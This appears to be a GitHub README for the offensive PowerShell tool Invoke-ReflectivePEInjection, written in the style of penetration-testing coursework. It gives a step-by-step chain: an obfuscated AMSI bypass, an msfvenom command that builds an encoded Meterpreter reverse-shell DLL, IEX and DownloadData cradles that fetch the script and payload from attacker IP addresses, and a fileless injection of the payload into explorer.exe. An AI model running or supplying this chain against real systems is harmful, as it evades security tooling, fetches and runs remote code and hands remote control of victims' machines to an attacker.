# Invoke-ReflectivePEInjection

The script performs reflection to avoid writing assemblies to disk, after which it parses the desired PE file. It has two separate modes, the first is to reflectively load a DLL or EXE into the same process, and the second is to load a DLL into a remote process.
Since the complete code is almost 3000 lines, we are not going to cover the code itself but rather its usage. We must specify a DLL or EXE as an array of bytes in memory, which allows us to download and execute it without touching the disk.

For this exercise, we will use a Meterpreter DLL. To reflectively load a Meterpreter DLL in explorer.exe, we are going to download it using the PowerShell DownloadData method, place it in a byte array, and look up the desired process ID.
In order to execute the required commands, we must open a PowerShell window with "PowerShell -Exec Bypass", which allows script execution. Once the window is open, we will run the commands below.

# Prerequesities:
1. Bypass PowerShell AMSI:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)
```

# How to use
1. Create a DLL payload using msfvenom and upload it to the attackers web server (_start metasploit listener with same payload parameters_):
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f dll -t 300 -e x64/xor_dynamic -o met.dll
```


2. Import the _Invoke-ReflectivePEInjection.ps1_ script in this repository on the target machine:
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.198/Invoke-ReflectivePEInjection.ps1')
```


3. Load the DLL (or .exe) into a byte array and retrieve the `explorer` process ID.
  (**NOTE:** _change the process based on your target environment_):
```powershell
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.191/met.dll')
$procid = (Get-Process -Name explorer).Id
```


4. Supply the byte array (`-PEBytes`) and process ID (`-ProcId`) and execute the script:
```powershell
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

**Note:**
Ignore the `VoidFunc` error that appears after running the script, it is purely cosmetic:
![image](https://github.com/user-attachments/assets/29f9cab4-1e05-490d-83d6-55c71ead1ce3)

